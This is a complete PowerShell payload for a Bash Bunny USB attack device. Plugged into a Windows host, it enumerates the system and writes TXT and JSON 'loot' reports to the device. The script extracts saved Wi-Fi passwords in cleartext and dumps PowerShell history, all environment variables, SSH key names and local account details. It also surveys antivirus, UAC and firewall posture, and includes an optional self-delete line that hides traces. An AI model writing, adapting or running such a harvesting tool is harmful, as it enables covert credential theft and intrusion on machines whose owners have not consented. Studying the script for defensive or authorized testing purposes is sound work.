#Requires -Version 2.0
<#
  Payload   : cross-platform-enum / Windows component
  Author    : <operator>
  Device    : Bash Bunny (Mk I / Mk II)
  Target OS : Windows XP SP3 and later (PS 2.0 compatible), including Server
  Purpose   : OS, device, user, and network enumeration; saves TXT + JSON to BB loot dir
  Deploy    : Called by payload.txt; script is staged on the BashBunny STORAGE partition
#>

# ── Locate Bash Bunny storage volume ─────────────────────────────────────────
$BBDrive = $null
try {
    # Try WMI volume label first (most reliable)
    $BBDrive = (Get-WmiObject -Class Win32_Volume -ErrorAction Stop |
                Where-Object { $_.Label -eq 'BashBunny' } |
                Select-Object -First 1).Name
} catch {}

# Fallback: scan drive letters for a BashBunny marker file
if (-not $BBDrive) {
    foreach ($letter in 'D','E','F','G','H','I','J','K') {
        if (Test-Path "${letter}:\payload.txt") { $BBDrive = "${letter}:\"; break }
    }
}
if (-not $BBDrive) { $BBDrive = Split-Path -Parent $MyInvocation.MyCommand.Path }

$LootDir = Join-Path $BBDrive "loot\enum_$(hostname)_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Force -Path $LootDir | Out-Null

# ── Helper: safe command wrapper ──────────────────────────────────────────────
function Invoke-Safe {
    param([scriptblock]$Block, [string]$Default = 'N/A')
    try { $r = & $Block; if ($r) { return ($r -join "`n").Trim() } else { return $Default } }
    catch { return $Default }
}

# ── Helper: JSON string escape ────────────────────────────────────────────────
function ConvertTo-JsonString {
    param([string]$s)
    if (-not $s) { return '""' }
    $s = $s -replace '\\', '\\' -replace '"', '\"' -replace "`r`n", '\n' -replace "`n", '\n' -replace "`r", '\n' -replace "`t", '\t'
    return '"' + $s + '"'
}
function JsonKV { param([string]$k,[string]$v,[int]$indent=2)
    return ((' ' * $indent) + '"' + $k + '": ' + (ConvertTo-JsonString $v))
}

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1 — OPERATING SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════
$os = Get-WmiObject -Class Win32_OperatingSystem
$cs = Get-WmiObject -Class Win32_ComputerSystem
$bios = Get-WmiObject -Class Win32_BIOS

$OSName        = Invoke-Safe { $os.Caption }
$OSVersion     = Invoke-Safe { $os.Version }
$OSBuild       = Invoke-Safe { $os.BuildNumber }
$OSArch        = Invoke-Safe { $os.OSArchitecture }
$OSInstallDate = Invoke-Safe { [System.Management.ManagementDateTimeConverter]::ToDateTime($os.InstallDate).ToString('yyyy-MM-dd') }
$OSLastBoot    = Invoke-Safe { [System.Management.ManagementDateTimeConverter]::ToDateTime($os.LastBootUpTime).ToString('yyyy-MM-dd HH:mm:ss') }
$OSUptime      = Invoke-Safe {
    $boot = [System.Management.ManagementDateTimeConverter]::ToDateTime($os.LastBootUpTime)
    $up   = (Get-Date) - $boot
    "$($up.Days)d $($up.Hours)h $($up.Minutes)m"
}
$OSServicePack = Invoke-Safe { $os.ServicePackMajorVersion }
$OSLocale      = Invoke-Safe { $os.Locale }
$OSLanguage    = Invoke-Safe { $os.OSLanguage }
$RegisteredUser = Invoke-Safe { $os.RegisteredUser }
$Organization  = Invoke-Safe { $os.Organization }

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2 — HARDWARE / DEVICE
# ═══════════════════════════════════════════════════════════════════════════════
$Hostname      = Invoke-Safe { $env:COMPUTERNAME }
$Domain        = Invoke-Safe { $cs.Domain }
$Workgroup     = Invoke-Safe { if ($cs.PartOfDomain) { 'Domain: ' + $cs.Domain } else { 'Workgroup: ' + $cs.Workgroup } }
$Manufacturer  = Invoke-Safe { $cs.Manufacturer }
$Model         = Invoke-Safe { $cs.Model }
$SystemType    = Invoke-Safe { $cs.SystemType }
$TotalRAMGB    = Invoke-Safe { [math]::Round($cs.TotalPhysicalMemory / 1GB, 2).ToString() + ' GB' }
$FreeRAMGB     = Invoke-Safe { [math]::Round($os.FreePhysicalMemory / 1MB, 2).ToString() + ' GB' }
$BIOSVersion   = Invoke-Safe { $bios.SMBIOSBIOSVersion }
$BIOSDate      = Invoke-Safe { $bios.ReleaseDate -replace '(\d{4})(\d{2})(\d{2}).*','$1-$2-$3' }
$SerialNumber  = Invoke-Safe { $bios.SerialNumber }

# CPU
$CPUInfo = Invoke-Safe {
    Get-WmiObject -Class Win32_Processor | ForEach-Object {
        "$($_.Name) | Cores: $($_.NumberOfCores) | Threads: $($_.NumberOfLogicalProcessors) | Speed: $($_.MaxClockSpeed) MHz"
    }
}

# Disks
$DiskInfo = Invoke-Safe {
    Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object {
        "$($_.DeviceID) Size=$([math]::Round($_.Size/1GB,1))GB Free=$([math]::Round($_.FreeSpace/1GB,1))GB FS=$($_.FileSystem) Label='$($_.VolumeName)'"
    }
}

# Virtualization detection
$IsVM = Invoke-Safe {
    $vmSigns = @('VirtualBox','VMware','QEMU','Hyper-V','Xen','KVM','Virtual Machine','innotek','Parallels')
    $haystack = "$($cs.Manufacturer) $($cs.Model) $($bios.Version)"
    $found = $vmSigns | Where-Object { $haystack -match $_ }
    if ($found) { 'Yes: ' + ($found -join ', ') } else { 'No' }
}

# TPM
$TPMInfo = Invoke-Safe {
    $tpm = Get-WmiObject -Namespace 'root\cimv2\Security\MicrosoftTpm' -Class Win32_Tpm -ErrorAction Stop
    "Present: $($tpm.IsActivated_InitialValue), Enabled: $($tpm.IsEnabled_InitialValue), Version: $($tpm.SpecVersion)"
}

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3 — USER & ACCOUNT
# ═══════════════════════════════════════════════════════════════════════════════
$CurrentUser     = Invoke-Safe { $env:USERNAME }
$CurrentUserFull = Invoke-Safe { (Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -eq $env:USERNAME }).FullName }
$UserDomain      = Invoke-Safe { $env:USERDOMAIN }
$UserProfile     = Invoke-Safe { $env:USERPROFILE }
$IsAdmin = Invoke-Safe {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object Security.Principal.WindowsPrincipal($id)
    $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator).ToString()
}
$UserGroups = Invoke-Safe {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $id.Groups | ForEach-Object {
        try { $_.Translate([Security.Principal.NTAccount]).Value } catch { $_.Value }
    }
}
$LocalUsers = Invoke-Safe {
    Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True" | ForEach-Object {
        "$($_.Name) | Disabled=$($_.Disabled) | PasswordRequired=$($_.PasswordRequired) | PasswordExpires=$($_.PasswordExpires) | SID=$($_.SID)"
    }
}
$LocalGroups = Invoke-Safe {
    Get-WmiObject -Class Win32_Group -Filter "LocalAccount=True" | Select-Object -ExpandProperty Name
}
$LoggedOnUsers = Invoke-Safe { (Get-WmiObject -Class Win32_ComputerSystem).UserName }
$LastLogins = Invoke-Safe {
    Get-WmiObject -Class Win32_NetworkLoginProfile | Sort-Object LastLogon -Descending |
    Select-Object -First 10 | ForEach-Object { "$($_.Name) — $($_.LastLogon)" }
}
$PasswordPolicy = Invoke-Safe { net accounts 2>&1 }
$EnvVars = Invoke-Safe { Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" } }
$CmdHistory = Invoke-Safe {
    $hist = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($hist -and (Test-Path $hist)) { Get-Content $hist -Tail 50 }
}
$SSHKeys = Invoke-Safe {
    $sshDir = Join-Path $env:USERPROFILE '.ssh'
    if (Test-Path $sshDir) { Get-ChildItem $sshDir | Select-Object -ExpandProperty Name }
}

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4 — NETWORK
# ═══════════════════════════════════════════════════════════════════════════════
$Interfaces = Invoke-Safe {
    Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | ForEach-Object {
        $ips   = ($_.IPAddress   -join ', ')
        $masks = ($_.IPSubnet    -join ', ')
        $gws   = ($_.DefaultIPGateway -join ', ')
        $dns   = ($_.DNSServerSearchOrder -join ', ')
        "[$($_.Description)]`n  IP: $ips | Mask: $masks | GW: $gws | DNS: $dns | MAC: $($_.MACAddress) | DHCP: $($_.DHCPEnabled)"
    }
}
$PublicIP = Invoke-Safe {
    (New-Object Net.WebClient).DownloadString('https://api.ipify.org').Trim()
}
$ARPTable = Invoke-Safe { arp -a 2>&1 }
$RoutingTable = Invoke-Safe { route print 2>&1 }
$DNSCache = Invoke-Safe { ipconfig /displaydns 2>&1 }
$ActiveConnections = Invoke-Safe { netstat -ano 2>&1 }
$ListeningPorts = Invoke-Safe {
    netstat -ano | Select-String 'LISTENING' | ForEach-Object { $_.Line.Trim() }
}
$HostsFile = Invoke-Safe { Get-Content "$env:SystemRoot\System32\drivers\etc\hosts" | Where-Object { $_ -notmatch '^\s*#' -and $_.Trim() } }
$FirewallState = Invoke-Safe { netsh advfirewall show allprofiles state 2>&1 }
$FirewallRules = Invoke-Safe {
    netsh advfirewall firewall show rule name=all dir=in status=enabled verbose 2>&1 |
    Select-String 'Rule Name|Action|Enabled|Direction|Protocol|LocalPort|RemotePort' |
    Select-Object -First 100 | ForEach-Object { $_.Line.Trim() }
}
$SavedWiFi = Invoke-Safe {
    (netsh wlan show profiles 2>&1) | Select-String 'All User Profile' | ForEach-Object {
        $ssid = ($_ -split ':',2)[1].Trim()
        $pw = ((netsh wlan show profile name="`"$ssid`"" key=clear 2>&1) |
               Select-String 'Key Content' | ForEach-Object { ($_ -split ':',2)[1].Trim() })
        if ($pw) { "$ssid => KEY: $pw" } else { "$ssid => KEY: (not stored/WPA-Ent)" }
    }
}
$ProxySettings = Invoke-Safe {
    $r = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -ErrorAction Stop
    "ProxyEnable=$($r.ProxyEnable) | ProxyServer=$($r.ProxyServer) | AutoConfigURL=$($r.AutoConfigURL)"
}
$SharedFolders = Invoke-Safe {
    Get-WmiObject -Class Win32_Share | ForEach-Object { "$($_.Name) => $($_.Path) [$($_.Type)]" }
}

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5 — SECURITY POSTURE
# ═══════════════════════════════════════════════════════════════════════════════
$AVProducts = Invoke-Safe {
    Get-WmiObject -Namespace 'root\SecurityCenter2' -Class AntiVirusProduct -ErrorAction Stop |
    ForEach-Object { "$($_.displayName) | State: $($_.productState)" }
}
$UAC = Invoke-Safe {
    $v = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction Stop
    "EnableLUA=$($v.EnableLUA) | ConsentPromptBehaviorAdmin=$($v.ConsentPromptBehaviorAdmin) | PromptOnSecureDesktop=$($v.PromptOnSecureDesktop)"
}
$SecureBoot = Invoke-Safe {
    Confirm-SecureBootUEFI -ErrorAction Stop
}
$BitLocker = Invoke-Safe {
    manage-bde -status 2>&1 | Select-String 'Conversion Status|Protection Status|Lock Status' |
    ForEach-Object { $_.Line.Trim() }
}
$WindowsDefender = Invoke-Safe {
    $d = Get-MpComputerStatus -ErrorAction Stop
    "RTP=$($d.RealTimeProtectionEnabled) | Definitions=$($d.AntivirusSignatureLastUpdated) | AMRunning=$($d.AMRunning)"
}
$InstalledPatches = Invoke-Safe {
    Get-WmiObject -Class Win32_QuickFixEngineering | Sort-Object InstalledOn -Descending |
    Select-Object -First 20 | ForEach-Object { "$($_.HotFixID) installed $($_.InstalledOn)" }
}
$ScheduledTasks = Invoke-Safe {
    schtasks /query /fo LIST /v 2>&1 |
    Select-String 'TaskName|Status|Run As User|Next Run Time|Last Run Time' |
    Select-Object -First 80 | ForEach-Object { $_.Line.Trim() }
}
$Services = Invoke-Safe {
    Get-WmiObject -Class Win32_Service | Where-Object { $_.State -eq 'Running' } |
    ForEach-Object { "$($_.Name) | $($_.DisplayName) | StartMode=$($_.StartMode) | User=$($_.StartName)" }
}
$AutoRun = Invoke-Safe {
    @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    ) | ForEach-Object {
        $path = $_
        try {
            Get-ItemProperty $path -ErrorAction Stop | Get-Member -MemberType NoteProperty |
            Where-Object { $_.Name -notmatch '^PS' } |
            ForEach-Object { "[$path] $($_.Name) = $((Get-ItemProperty $path).$($_.Name))" }
        } catch {}
    }
}
$InstalledSoftware = Invoke-Safe {
    @(
        'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'
    ) | ForEach-Object {
        try {
            Get-ItemProperty $_ -ErrorAction Stop |
            Where-Object { $_.DisplayName } |
            ForEach-Object { "$($_.DisplayName) $($_.DisplayVersion) ($($_.Publisher))" }
        } catch {}
    } | Sort-Object -Unique
}

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6 — PROCESSES
# ═══════════════════════════════════════════════════════════════════════════════
$RunningProcesses = Invoke-Safe {
    Get-WmiObject -Class Win32_Process | ForEach-Object {
        "$($_.ProcessId) | $($_.Name) | User=$($_.GetOwner().User) | Path=$($_.ExecutablePath)"
    }
}

# ═══════════════════════════════════════════════════════════════════════════════
# BUILD TXT REPORT
# ═══════════════════════════════════════════════════════════════════════════════
$divider = "=" * 72
$report = @"
$divider
  HAK5 BASH BUNNY — CROSS-PLATFORM ENUMERATION REPORT
  Host       : $Hostname
  Timestamp  : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') UTC$(([System.TimeZoneInfo]::Local).BaseUtcOffset)
  Platform   : Windows
$divider

── OPERATING SYSTEM ──────────────────────────────────────────────────────────
OS Name        : $OSName
Version        : $OSVersion (Build $OSBuild)
Architecture   : $OSArch
Service Pack   : $OSServicePack
Install Date   : $OSInstallDate
Last Boot      : $OSLastBoot
Uptime         : $OSUptime
Locale         : $OSLocale
Registered To  : $RegisteredUser / $Organization

── HARDWARE ──────────────────────────────────────────────────────────────────
Hostname       : $Hostname
Manufacturer   : $Manufacturer
Model          : $Model
System Type    : $SystemType
Virtual Machine: $IsVM
Serial Number  : $SerialNumber
BIOS Version   : $BIOSVersion ($BIOSDate)
RAM Total      : $TotalRAMGB
RAM Free       : $FreeRAMGB
TPM            : $TPMInfo

CPU:
$CPUInfo

Disks:
$DiskInfo

── DOMAIN / WORKGROUP ────────────────────────────────────────────────────────
$Workgroup

── CURRENT USER ──────────────────────────────────────────────────────────────
Username       : $CurrentUser ($CurrentUserFull)
Domain         : $UserDomain
Profile Path   : $UserProfile
Administrator  : $IsAdmin

Groups:
$UserGroups

── LOCAL USERS ───────────────────────────────────────────────────────────────
$LocalUsers

── LOCAL GROUPS ──────────────────────────────────────────────────────────────
$LocalGroups

── PASSWORD POLICY ───────────────────────────────────────────────────────────
$PasswordPolicy

── LAST LOGINS ───────────────────────────────────────────────────────────────
$LastLogins

── SSH KEYS ──────────────────────────────────────────────────────────────────
$SSHKeys

── POWERSHELL HISTORY (last 50) ──────────────────────────────────────────────
$CmdHistory

── ENVIRONMENT VARIABLES ─────────────────────────────────────────────────────
$EnvVars

── NETWORK INTERFACES ────────────────────────────────────────────────────────
$Interfaces

Public IP      : $PublicIP

── ROUTING TABLE ─────────────────────────────────────────────────────────────
$RoutingTable

── ARP TABLE ─────────────────────────────────────────────────────────────────
$ARPTable

── DNS CACHE ─────────────────────────────────────────────────────────────────
$DNSCache

── ACTIVE CONNECTIONS ────────────────────────────────────────────────────────
$ActiveConnections

── LISTENING PORTS ───────────────────────────────────────────────────────────
$ListeningPorts

── HOSTS FILE ────────────────────────────────────────────────────────────────
$HostsFile

── PROXY SETTINGS ────────────────────────────────────────────────────────────
$ProxySettings

── SHARED FOLDERS ────────────────────────────────────────────────────────────
$SharedFolders

── SAVED WIFI PROFILES ───────────────────────────────────────────────────────
$SavedWiFi

── FIREWALL STATUS ───────────────────────────────────────────────────────────
$FirewallState

── FIREWALL RULES (inbound enabled, first 100) ───────────────────────────────
$FirewallRules

── SECURITY PRODUCTS ─────────────────────────────────────────────────────────
Antivirus      : $AVProducts
Windows Defender: $WindowsDefender
UAC            : $UAC
Secure Boot    : $SecureBoot
BitLocker      : $BitLocker

── INSTALLED PATCHES (last 20) ───────────────────────────────────────────────
$InstalledPatches

── RUNNING SERVICES ──────────────────────────────────────────────────────────
$Services

── SCHEDULED TASKS ───────────────────────────────────────────────────────────
$ScheduledTasks

── AUTORUN ENTRIES ───────────────────────────────────────────────────────────
$AutoRun

── RUNNING PROCESSES ─────────────────────────────────────────────────────────
$RunningProcesses

── INSTALLED SOFTWARE ────────────────────────────────────────────────────────
$InstalledSoftware

$divider
  END OF REPORT
$divider
"@

$TxtPath = Join-Path $LootDir "enum_windows.txt"
$report | Set-Content -Path $TxtPath -Encoding UTF8

# ═══════════════════════════════════════════════════════════════════════════════
# BUILD JSON REPORT
# ═══════════════════════════════════════════════════════════════════════════════
$JsonPath = Join-Path $LootDir "enum_windows.json"

function JArr { param([string]$raw)
    if (-not $raw -or $raw -eq 'N/A') { return '[]' }
    $lines = $raw -split "`n" | Where-Object { $_.Trim() } | ForEach-Object {
        '    ' + (ConvertTo-JsonString $_.Trim())
    }
    return "[\n" + ($lines -join ",`n") + "`n  ]"
}

$json = @"
{
  "meta": {
    "tool": "Bash Bunny cross-platform-enum",
    "platform": "Windows",
    "hostname": $(ConvertTo-JsonString $Hostname),
    "timestamp": "$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ssK')"
  },
  "os": {
    "name": $(ConvertTo-JsonString $OSName),
    "version": $(ConvertTo-JsonString $OSVersion),
    "build": $(ConvertTo-JsonString $OSBuild),
    "architecture": $(ConvertTo-JsonString $OSArch),
    "service_pack": $(ConvertTo-JsonString $OSServicePack),
    "install_date": $(ConvertTo-JsonString $OSInstallDate),
    "last_boot": $(ConvertTo-JsonString $OSLastBoot),
    "uptime": $(ConvertTo-JsonString $OSUptime),
    "locale": $(ConvertTo-JsonString $OSLocale),
    "registered_user": $(ConvertTo-JsonString $RegisteredUser),
    "organization": $(ConvertTo-JsonString $Organization)
  },
  "hardware": {
    "hostname": $(ConvertTo-JsonString $Hostname),
    "manufacturer": $(ConvertTo-JsonString $Manufacturer),
    "model": $(ConvertTo-JsonString $Model),
    "system_type": $(ConvertTo-JsonString $SystemType),
    "virtual_machine": $(ConvertTo-JsonString $IsVM),
    "serial_number": $(ConvertTo-JsonString $SerialNumber),
    "bios_version": $(ConvertTo-JsonString $BIOSVersion),
    "bios_date": $(ConvertTo-JsonString $BIOSDate),
    "ram_total": $(ConvertTo-JsonString $TotalRAMGB),
    "ram_free": $(ConvertTo-JsonString $FreeRAMGB),
    "tpm": $(ConvertTo-JsonString $TPMInfo),
    "cpu": $(JArr $CPUInfo),
    "disks": $(JArr $DiskInfo)
  },
  "domain": $(ConvertTo-JsonString $Workgroup),
  "user": {
    "username": $(ConvertTo-JsonString $CurrentUser),
    "full_name": $(ConvertTo-JsonString $CurrentUserFull),
    "domain": $(ConvertTo-JsonString $UserDomain),
    "profile_path": $(ConvertTo-JsonString $UserProfile),
    "is_administrator": $(ConvertTo-JsonString $IsAdmin),
    "groups": $(JArr $UserGroups),
    "ssh_keys": $(JArr $SSHKeys),
    "powershell_history": $(JArr $CmdHistory)
  },
  "local_accounts": {
    "users": $(JArr $LocalUsers),
    "groups": $(JArr $LocalGroups),
    "password_policy": $(ConvertTo-JsonString $PasswordPolicy),
    "last_logins": $(JArr $LastLogins)
  },
  "network": {
    "interfaces": $(JArr $Interfaces),
    "public_ip": $(ConvertTo-JsonString $PublicIP),
    "arp_table": $(JArr $ARPTable),
    "routing_table": $(JArr $RoutingTable),
    "dns_cache": $(JArr $DNSCache),
    "active_connections": $(JArr $ActiveConnections),
    "listening_ports": $(JArr $ListeningPorts),
    "hosts_file": $(JArr $HostsFile),
    "proxy": $(ConvertTo-JsonString $ProxySettings),
    "shared_folders": $(JArr $SharedFolders),
    "saved_wifi": $(JArr $SavedWiFi),
    "firewall_state": $(ConvertTo-JsonString $FirewallState),
    "firewall_rules_sample": $(JArr $FirewallRules)
  },
  "security": {
    "antivirus": $(JArr $AVProducts),
    "windows_defender": $(ConvertTo-JsonString $WindowsDefender),
    "uac": $(ConvertTo-JsonString $UAC),
    "secure_boot": $(ConvertTo-JsonString $SecureBoot),
    "bitlocker": $(JArr $BitLocker),
    "installed_patches": $(JArr $InstalledPatches)
  },
  "persistence": {
    "services_running": $(JArr $Services),
    "scheduled_tasks": $(JArr $ScheduledTasks),
    "autorun": $(JArr $AutoRun)
  },
  "software": {
    "installed": $(JArr $InstalledSoftware),
    "processes_running": $(JArr $RunningProcesses)
  },
  "environment": $(JArr $EnvVars)
}
"@

$json | Set-Content -Path $JsonPath -Encoding UTF8

# Signal completion via a marker file
"OK $(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')" | Set-Content -Path (Join-Path $LootDir ".done") -Encoding ASCII

# Self-delete from temp if desired (optional — remove line to retain script on host)
# Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
